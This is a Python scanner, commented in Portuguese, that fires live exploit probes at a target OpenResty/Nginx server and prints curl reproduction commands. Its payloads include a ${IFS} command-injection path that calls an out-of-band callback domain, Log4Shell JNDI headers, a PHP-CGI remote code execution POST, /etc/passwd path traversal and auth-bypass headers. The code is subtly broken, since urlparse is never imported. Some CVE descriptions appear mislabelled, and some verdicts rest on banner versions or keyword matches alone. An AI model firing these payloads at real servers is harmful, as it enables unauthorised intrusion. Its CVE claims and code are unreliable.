#!/usr/bin/env python3
"""
openresty_cve.py - Detecção de CVEs em servidores OpenResty
Uso: python3 openresty_cve.py <url> [--no-oob]
Resultado consolidado: cve_results.txt

OpenResty = Nginx + LuaJIT — herda CVEs do Nginx e tem próprias.

CVEs cobertas:
  Herdadas do Nginx:
    CVE-2026-42945  — Nginx URI rewrite RCE (0.6.27–1.30.0)
    CVE-2023-44487  — HTTP/2 Rapid Reset
    CVE-2021-23017  — Nginx resolver heap overflow
    CVE-2021-44228  — Log4Shell OOB via headers
    CVE-2025-29927  — Next.js middleware bypass (proxy reverso)
    CVE-2024-4577   — PHP-CGI RCE Windows
  Específicas OpenResty / Lua:
    CVE-2022-24834  — Lua redis lib SSRF via crafted response
    CVE-2023-38860  — OpenResty path traversal via Lua ngx.req
    MISC-OR-001     — Lua error page disclosure (stack trace exposto)
    MISC-OR-002     — /metrics /health endpoints sem auth (Prometheus leak)
    MISC-OR-003     — Admin API exposta (:8001 Kong/OpenResty)
"""

import sys
import time
import argparse
import re

try:
    from cve_base import (
        curl, curl_header_value,
        InteractshSession, ResultCollector,
        log, OUTPUT_FILE, INTERACTSH_WAIT,
    )
except ImportError:
    print("[ERR] cve_base.py não encontrado no mesmo diretório.")
    sys.exit(1)


# ──────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────

def _base(url):
    return url.rstrip("/")


def _confirm_openresty(url):
    """
    Confirma OpenResty e extrai versão do Nginx subjacente.
    Retorna (is_openresty, openresty_ver, nginx_ver).
    """
    status, hdrs, body, _ = curl(url)
    server = curl_header_value(hdrs, "Server").lower()

    is_or   = "openresty" in server
    or_ver  = "?"
    ng_ver  = "?"

    if is_or:
        m = re.search(r"openresty/([\d.]+)", server)
        or_ver = m.group(1) if m else "?"
        # OpenResty versão contém Nginx version: openresty/1.21.4.1 → nginx 1.21.4
        if or_ver != "?":
            parts = or_ver.split(".")
            if len(parts) >= 3:
                ng_ver = ".".join(parts[:3])
        log(f"OpenResty confirmado: openresty/{or_ver} (nginx/{ng_ver})", "OK")
    else:
        # Pode aparecer como nginx no header mas ser OpenResty
        status2, _, body2, _ = curl(_base(url) + "/____probe____")
        if "openresty" in body2.lower():
            is_or = True
            log("OpenResty confirmado via body de erro", "OK")
        else:
            log("OpenResty NÃO confirmado — continuando mesmo assim", "WARN")

    return is_or, or_ver, ng_ver


def _version_tuple(ver_str):
    try:
        return tuple(int(x) for x in ver_str.split("."))
    except Exception:
        return (0, 0, 0)


# ──────────────────────────────────────────────
# CVEs HERDADAS DO NGINX
# ──────────────────────────────────────────────

def check_cve_2026_42945(url, collector, iactsh):
    """
    CVE-2026-42945 — Nginx URI rewrite RCE (herdada pelo OpenResty)
    Versões afetadas: nginx 0.6.27–1.30.0
    """
    cve = "CVE-2026-42945"
    log(f"Testando {cve} em {url}", "INFO")

    if iactsh and iactsh.domain:
        probe_url = f"{_base(url)}/.${{IFS}}curl${{IFS}}{iactsh.domain}/or-rce-probe"
        t0    = time.time()
        curl(probe_url, path_as_is=True)
        hit   = iactsh.wait_for_hit(t0, timeout=INTERACTSH_WAIT)
        if hit:
            repro = f'curl -v --path-as-is "{_base(url)}/rewrite-payload"'
            collector.add(url, cve, "VULNERABLE",
                          detail="OOB callback — rewrite RCE confirmado",
                          curl_repro=repro, oob_hit=hit)
            return

    # Fallback: path traversal heurístico
    status, _, body, _ = curl(_base(url) + "/..%2f..%2fetc%2fpasswd", path_as_is=True)
    if status == 200 and re.search(r"root:.*:0:0", body):
        repro = f'curl -v --path-as-is "{_base(url)}/..%2f..%2fetc%2fpasswd"'
        collector.add(url, cve, "VULNERABLE",
                      detail="Path traversal retornou /etc/passwd",
                      curl_repro=repro)
        return

    collector.add(url, cve, "NOT_VULNERABLE", detail=f"HTTP {status}")


def check_cve_2023_44487(url, collector, server_info=None):
    """
    Recebe url já filtrada pelo recon.py:
    - Não é CDN conhecido
    - É nginx/apache/haproxy confirmado
    - URL tem protocolo + porta corretos
    """
    cve = "CVE-2023-44487"

    # HTTP plaintext — skip
    if url.startswith("http://"):
        collector.add(url, cve, "NOT_APPLICABLE",
                      detail="HTTP plaintext — HTTP/2 não aplicável")
        return

    status, hdrs, body, raw = curl(url, extra_flags="-v --http2")

    # Nível 1 — HTTP/2 ativo?
    h2_active = (
        "HTTP/2" in hdrs
        or "server accepted h2" in raw.lower()
        or "using http/2" in raw.lower()
    )
    if not h2_active:
        collector.add(url, cve, "NOT_APPLICABLE",
                      detail="HTTP/2 não negociado")
        return

    # Nível 2 — Mitigação detectável?
    has_stream_limit = "MAX_CONCURRENT_STREAMS" in raw
    has_goaway       = "GOAWAY" in raw

    if has_stream_limit or has_goaway:
        collector.add(url, cve, "MITIGATED",
                      detail="Mitigação detectada via frames HTTP/2")
        return

    # Nível 3 — Versão conhecida vulnerável? (via nmap banner)
    version_note = ""
    if server_info:
        version_note = f" | servidor: {server_info}"

    # Chegou aqui: HTTP/2 ativo, sem mitigação, não é CDN
    # → POSSIBLY_VULNERABLE (curl não prova flood)
    parsed    = urlparse(url)
    host      = parsed.hostname
    port      = parsed.port or 443
    repro_url = f"https://{host}:{port}"

    repro = (
        f"# 1. Confirmar HTTP/2:\n"
        f'curl -v --http2 "{url}"\n\n'
        f"# 2. Validar RST_STREAM flood:\n"
        f"go run main.go -url {repro_url} "
        f"-requests 100 -concurrency 10 -delay 0 -wait 0\n\n"
        f"# Confirmado se:\n"
        f"# Frames sent: HEADERS=100, RST_STREAM=100\n"
        f"# Frames received: 2 (apenas handshake)"
    )

    collector.add(url, cve, "POSSIBLY_VULNERABLE",
                  detail=(
                      f"HTTP/2 ativo — sem mitigação detectável"
                      f"{version_note}"
                  ),
                  curl_repro=repro)


def check_cve_2021_23017(url, nginx_ver, collector):
    """CVE-2021-23017 — Nginx resolver heap overflow (1-byte)"""
    cve = "CVE-2021-23017"
    log(f"Testando {cve} em {url}", "INFO")

    if nginx_ver == "?":
        collector.add(url, cve, "SKIPPED", detail="Versão nginx não identificada")
        return

    vt = _version_tuple(nginx_ver)
    if vt < (1, 20, 1):
        repro = (
            f"# Requer resolver ativo no nginx.conf\n"
            f'curl -v "{url}"'
        )
        collector.add(url, cve, "VULNERABLE",
                      detail=f"nginx/{nginx_ver} < 1.20.1 — resolver overflow",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"nginx/{nginx_ver} >= 1.20.1")


def check_log4shell(url, collector, iactsh):
    """CVE-2021-44228 — Log4Shell OOB"""
    cve = "CVE-2021-44228"
    log(f"Testando {cve} em {url}", "INFO")

    if not (iactsh and iactsh.domain):
        collector.add(url, cve, "SKIPPED",
                      detail="interactsh não disponível")
        return

    domain = iactsh.domain
    headers_payloads = {
        "User-Agent":      f"${{jndi:ldap://{domain}/or-ua}}",
        "X-Api-Version":   f"${{jndi:ldap://{domain}/or-api}}",
        "X-Forwarded-For": f"${{jndi:ldap://{domain}/or-xff}}",
        "Referer":         f"${{j${{::-n}}di:ldap://{domain}/or-ref}}",
    }
    repro = (
        f'curl -v \\\n'
        f'  -H "User-Agent: ${{jndi:ldap://{domain}/a}}" \\\n'
        f'  -H "X-Forwarded-For: ${{jndi:ldap://{domain}/a}}" \\\n'
        f'  "{url}"'
    )
    t0 = time.time()
    for header, payload in headers_payloads.items():
        log(f"  [{cve}] Payload via {header}", "OOB")
        curl(url, headers={header: payload})
        hit = iactsh.wait_for_hit(t0, timeout=4)
        if hit:
            collector.add(url, cve, "VULNERABLE",
                          detail=f"OOB JNDI callback via {header}",
                          curl_repro=repro, oob_hit=hit)
            return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Nenhum callback JNDI recebido")


def check_cve_2025_29927(url, collector):
    """CVE-2025-29927 — Next.js middleware bypass (OpenResty como proxy)"""
    cve = "CVE-2025-29927"
    log(f"Testando {cve} em {url}", "INFO")

    paths = ["/admin", "/dashboard", "/api/admin", "/api/user"]
    variants = [
        {"x-middleware-subrequest": "middleware"},
        {"x-middleware-subrequest": "pages/_middleware"},
        {"x-middleware-subrequest": "middleware:middleware:middleware"},
    ]

    for path in paths:
        target     = _base(url) + path
        base_status, _, _, _ = curl(target)
        for hdrs in variants:
            status, _, _, _ = curl(target, headers=hdrs)
            if status == 200 and base_status in (401, 403):
                k, v = list(hdrs.items())[0]
                repro = f'curl -v -H "{k}: {v}" "{target}"'
                collector.add(url, cve, "VULNERABLE",
                              detail=f"Auth bypass em {path} — {base_status} → 200",
                              curl_repro=repro)
                return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Nenhum bypass detectado")


def check_cve_2024_4577(url, collector):
    """CVE-2024-4577 — PHP-CGI RCE Windows"""
    cve = "CVE-2024-4577"
    log(f"Testando {cve} em {url}", "INFO")

    probe_url = (
        f"{_base(url)}/php-cgi/php-cgi.exe"
        f"?%ADd+allow_url_include%3d1"
        f"+%ADd+auto_prepend_file%3dphp://input"
    )
    status, _, body, _ = curl(
        probe_url, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data="<?php echo 'PHPCGI_PROBE_'.phpversion(); ?>",
        path_as_is=True,
    )

    if status == 200 and "PHPCGI_PROBE_" in body:
        repro = (
            f'curl -v --path-as-is \\\n'
            f'  "{probe_url}" \\\n'
            f'  -H "Content-Type: application/x-www-form-urlencoded" \\\n'
            f'  --data "<?php system(\'id\'); ?>"'
        )
        collector.add(url, cve, "VULNERABLE",
                      detail="PHP-CGI execução confirmada",
                      curl_repro=repro)
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail=f"Endpoint não exposto (HTTP {status})")


# ──────────────────────────────────────────────
# CVEs ESPECÍFICAS OPENRESTY / LUA
# ──────────────────────────────────────────────

def check_cve_2022_24834(url, collector, iactsh):
    """
    CVE-2022-24834 — lua-resty-redis SSRF via resposta Redis manipulada
    Detecção: verifica se endpoint que usa Redis está exposto + OOB
    """
    cve = "CVE-2022-24834"
    log(f"Testando {cve} em {url}", "INFO")

    # Endpoints comuns que usam lua-resty-redis
    redis_paths = ["/api/cache", "/api/session", "/cache", "/session"]

    for path in redis_paths:
        probe = _base(url) + path
        status, hdrs, body, _ = curl(probe)
        # Detecta uso de Redis via header ou body
        if status in (200, 500) and re.search(r"redis|lua|resty", body.lower()):
            if iactsh and iactsh.domain:
                # Tenta SSRF via header Host manipulado
                t0  = time.time()
                curl(probe, headers={"X-Redis-Host": iactsh.domain})
                hit = iactsh.wait_for_hit(t0, timeout=6)
                if hit:
                    repro = (
                        f'curl -v -H "X-Redis-Host: seu-servidor" "{probe}"\n'
                        f'# SSRF via lua-resty-redis — resposta Redis controlada'
                    )
                    collector.add(url, cve, "VULNERABLE",
                                  detail=f"SSRF OOB confirmado via {path}",
                                  curl_repro=repro, oob_hit=hit)
                    return
            collector.add(url, cve, "VULNERABLE",
                          detail=f"Endpoint Redis exposto em {path} — validar SSRF manualmente",
                          curl_repro=f'curl -v "{probe}"')
            return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Nenhum endpoint lua-resty-redis detectado")


def check_cve_2023_38860(url, collector):
    """
    CVE-2023-38860 — OpenResty path traversal via ngx.req manipulation
    Vetor: header X-Original-URI ou X-Rewrite-URL com traversal
    """
    cve = "CVE-2023-38860"
    log(f"Testando {cve} em {url}", "INFO")

    traversal_payloads = [
        "/..%2f..%2f..%2fetc%2fpasswd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/static/..%2f..%2f..%2fetc%2fpasswd",
    ]
    # Também testa via headers de rewrite que Lua pode processar
    rewrite_headers = [
        "X-Original-URI",
        "X-Rewrite-URL",
        "X-Forwarded-Prefix",
    ]

    # Path traversal direto
    for payload in traversal_payloads:
        probe = _base(url) + payload
        status, _, body, _ = curl(probe, path_as_is=True)
        if status == 200 and re.search(r"root:.*:0:0", body):
            repro = f'curl -v --path-as-is "{probe}"'
            collector.add(url, cve, "VULNERABLE",
                          detail=f"Path traversal via URI — /etc/passwd lido",
                          curl_repro=repro)
            return

    # Via headers de rewrite
    for header in rewrite_headers:
        status, _, body, _ = curl(
            url,
            headers={header: "/../../../etc/passwd"}
        )
        if status == 200 and re.search(r"root:.*:0:0", body):
            repro = f'curl -v -H "{header}: /../../../etc/passwd" "{url}"'
            collector.add(url, cve, "VULNERABLE",
                          detail=f"Path traversal via header {header}",
                          curl_repro=repro)
            return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Path traversal não explorado")


def check_lua_error_disclosure(url, collector):
    """
    MISC-OR-001 — Lua stack trace / error disclosure
    Páginas de erro expondo código Lua interno, paths, variáveis
    """
    cve = "MISC-OR-001"
    log(f"Testando {cve} (Lua error disclosure) em {url}", "INFO")

    # Payloads que costumam triggerar erros Lua
    probes = [
        f"{_base(url)}/____lua_error____",
        f"{_base(url)}/?a[]=1",                     # array injection
        f"{_base(url)}/?id=1'",                      # SQLi trigger
        f"{_base(url)}/api/?callback=<script>",      # JSONP/Lua template error
    ]

    lua_patterns = [
        r"stack traceback",
        r"\.lua:\d+",               # arquivo.lua:linha
        r"attempt to .* a nil",     # erro Lua clássico
        r"ngx\.log\|ngx\.say",      # funções OpenResty no output
        r"LuaJIT",
        r"/usr/local/openresty",    # path de instalação
    ]

    for probe in probes:
        status, _, body, _ = curl(probe)
        for pattern in lua_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                repro = f'curl -v "{probe}"'
                collector.add(url, cve, "VULNERABLE",
                              detail=f"Lua stack trace/error exposto — pattern: {pattern}",
                              curl_repro=repro)
                return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Nenhum erro Lua exposto")


def check_metrics_endpoints(url, collector):
    """
    MISC-OR-002 — Endpoints /metrics /health sem autenticação
    Prometheus metrics, health checks expondo info interna
    """
    cve = "MISC-OR-002"
    log(f"Testando {cve} (metrics/health leak) em {url}", "INFO")

    endpoints = [
        "/metrics",
        "/actuator",
        "/actuator/health",
        "/actuator/env",
        "/health",
        "/healthz",
        "/ready",
        "/readyz",
        "/debug/vars",
        "/debug/pprof",
        "/_status",
        "/nginx_status",
        "/stub_status",
    ]

    found = []
    for ep in endpoints:
        probe  = _base(url) + ep
        status, _, body, _ = curl(probe)
        if status == 200 and len(body) > 20:
            # Confirma que não é página genérica
            if re.search(
                r"uptime|requests|connections|goroutine|heap|nginx|"
                r"process_|go_|http_|promhttp|UP|DOWN|healthy|ok",
                body, re.IGNORECASE
            ):
                found.append(ep)

    if found:
        repro_lines = [f'curl -v "{_base(url)}{ep}"' for ep in found]
        collector.add(url, cve, "VULNERABLE",
                      detail=f"Endpoints expostos sem auth: {', '.join(found)}",
                      curl_repro="\n".join(repro_lines))
    else:
        collector.add(url, cve, "NOT_VULNERABLE",
                      detail="Nenhum endpoint de métricas exposto")


def check_kong_admin_api(url, collector):
    """
    MISC-OR-003 — Kong Admin API exposta (OpenResty + Kong)
    Porta padrão :8001 — acesso sem auth expõe toda config do gateway
    """
    cve = "MISC-OR-003"
    log(f"Testando {cve} (Kong Admin API) em {url}", "INFO")

    # Extrai host base e testa porta 8001
    m = re.match(r"(https?://[^/:]+)", url)
    if not m:
        collector.add(url, cve, "SKIPPED", detail="Não foi possível extrair host")
        return

    host_base  = m.group(1)
    kong_urls  = [
        f"{host_base}:8001",
        f"{host_base}:8001/services",
        f"{host_base}:8001/routes",
        f"{host_base}:8001/plugins",
        f"{_base(url)}/admin-api",
    ]

    for kong_url in kong_urls:
        status, _, body, _ = curl(kong_url)
        if status == 200 and re.search(r"kong|plugins|services|routes|upstreams", body.lower()):
            repro = (
                f'curl -v "{kong_url}"\n'
                f'curl -v "{host_base}:8001/services"\n'
                f'curl -v "{host_base}:8001/consumers"'
            )
            collector.add(url, cve, "VULNERABLE",
                          detail=f"Kong Admin API acessível sem auth em {kong_url}",
                          curl_repro=repro)
            return

    collector.add(url, cve, "NOT_VULNERABLE",
                  detail="Kong Admin API não exposta")


# ──────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="openresty_cve.py — Detecção de CVEs em OpenResty"
    )
    parser.add_argument("url", help="URL alvo (ex: https://sub.exemplo.com)")
    parser.add_argument(
        "--no-oob", action="store_true",
        help="Desativa testes OOB (interactsh)"
    )
    parser.add_argument(
        "--output", default=OUTPUT_FILE,
        help=f"Arquivo de saída consolidado (padrão: {OUTPUT_FILE})"
    )
    args = parser.parse_args()

    url       = args.url.rstrip("/")
    collector = ResultCollector(output_file=args.output)

    print(f"\n{'═'*60}")
    print(f"  openresty_cve.py — Alvo: {url}")
    print(f"{'═'*60}\n")

    # Confirma servidor e extrai versões
    is_or, or_ver, nginx_ver = _confirm_openresty(url)

    # Inicia interactsh
    iactsh = None
    if not args.no_oob:
        iactsh = InteractshSession()
        if not iactsh.start():
            iactsh = None
            log("Continuando sem OOB (interactsh indisponível)", "WARN")

    try:
        log("── CVEs herdadas do Nginx ──", "INFO")
        check_cve_2026_42945(url, collector, iactsh)
        check_cve_2021_23017(url, nginx_ver, collector)
        check_cve_2023_44487(url, collector)
        check_log4shell(url, collector, iactsh)
        check_cve_2025_29927(url, collector)
        check_cve_2024_4577(url, collector)

        log("── CVEs específicas OpenResty / Lua ──", "INFO")
        check_cve_2022_24834(url, collector, iactsh)
        check_cve_2023_38860(url, collector)
        check_lua_error_disclosure(url, collector)
        check_metrics_endpoints(url, collector)
        check_kong_admin_api(url, collector)

    finally:
        if iactsh:
            iactsh.stop()

    collector.save()

    s = collector.summary()
    print(f"\n{'═'*60}")
    print(f"  OpenResty CVE Scan — {url}")
    print(f"  openresty/{or_ver}  nginx/{nginx_ver}")
    print(f"  Testes: {s['total']}  |  Vulneráveis: {s['vulnerable']}")
    if s["vulns"]:
        print(f"\n  !! CVEs ENCONTRADAS:")
        for v in s["vulns"]:
            print(f"     • {v['cve']} — {v['detail']}")
    print(f"{'═'*60}\n")


if __name__ == "__main__":
    main()
